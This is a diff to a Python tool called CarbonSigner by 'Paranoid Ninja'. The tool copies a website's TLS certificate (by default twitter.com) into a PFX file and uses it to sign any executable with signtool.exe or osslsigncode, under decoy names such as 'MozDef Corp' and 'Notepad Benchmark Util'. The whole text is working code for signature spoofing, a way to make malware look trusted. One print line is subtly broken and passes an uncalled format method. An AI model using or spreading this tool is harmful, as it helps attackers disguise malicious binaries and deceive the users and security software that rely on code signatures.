@@ -8,6 +8,7 @@
 from OpenSSL import crypto
 from sys import argv, platform
 from pathlib import Path
+import argparse
 import shutil
 import ssl
 import os
@@ -66,24 +67,37 @@ def CarbonCopy(host, port, signee, signed):
         pfxdata = pfx.export()
 
         PFXFILE.write_bytes(pfxdata)
+        print("[+] Print content: ")
+        print("Version:{}".format(cert.get_version()))
+        print("Serial Number: {}".format(cert.get_serial_number()))
+        print("Subject: {}".format(cert.get_subject()))
+        print("Issuer: {}".format(cert.get_issuer()))
+        print("Not before: {}".format(cert.get_notBefore()))
+        print("Not after: {}".format(cert.get_notAfter()))
+        print(signee,signed)
+        if not(signee == "" or signed == ""):
+            if platform == "win32":
+                print("[+] Platform is Windows OS...")
+                print("[+] Signing %s with signtool.exe..." %(signed))
+                shutil.copy(signee, signed)
+                subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
+                    "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
+                    "/td", "SHA256", "/fd", "SHA256", signed])
 
-        if platform == "win32":
-            print("[+] Platform is Windows OS...")
-            print("[+] Signing %s with signtool.exe..." %(signed))
-            shutil.copy(signee, signed)
-            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
-                "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
-                "/td", "SHA256", "/fd", "SHA256", signed])
-
+            else:
+                print("[+] Platform is Linux OS...")
+                print("[+] Signing %s with %s using osslsigncode..." %(signee, PFXFILE))
+                args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
+                        "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
+                        "-in", signee, "-out", signed)
+                print("[+] ", end='', flush=True)
+                subprocess.check_call(args)
+                print("[+] Verify binary {} ... ".format)
+                args = ("osslsigncode", "verify",signed)
+                print("", end='', flush=True)
+                subprocess.check_call(args)
         else:
-            print("[+] Platform is Linux OS...")
-            print("[+] Signing %s with %s using osslsigncode..." %(signee, PFXFILE))
-            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
-                    "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
-                    "-in", signee, "-out", signed)
-            print("[+] ", end='', flush=True)
-            subprocess.check_call(args)
-
+            print("[+] No binary specify, leaving.")
     except Exception as ex:
         print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))
 
@@ -93,10 +107,12 @@ def main():
  +-+-+-+-+-+-+-+-+-+-+-+-+
 
   CarbonSigner v1.0\n  Author: Paranoid Ninja\n""")
-    if len(argv) != 5:
-        print("[+] Descr: Impersonates the Certificate of a website\n[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
-    else:
-        CarbonCopy(argv[1], argv[2], argv[3], argv[4])
-
+    parser = argparse.ArgumentParser(description=" Impersonates the Certificate of a website")
+    parser.add_argument('-t', '--target', type=str, default="www.twitter.com", help="Target")
+    parser.add_argument('-p', '--port', type=str, default="443", help="Port")
+    parser.add_argument('-e', '--executable', type=str, help="Build executable")
+    parser.add_argument('-o', '--output', type=str, help="Output file for signed executable")
+    args = parser.parse_args()
+    CarbonCopy(args.target, args.port, args.executable, args.output)
 if __name__ == "__main__":
     main()
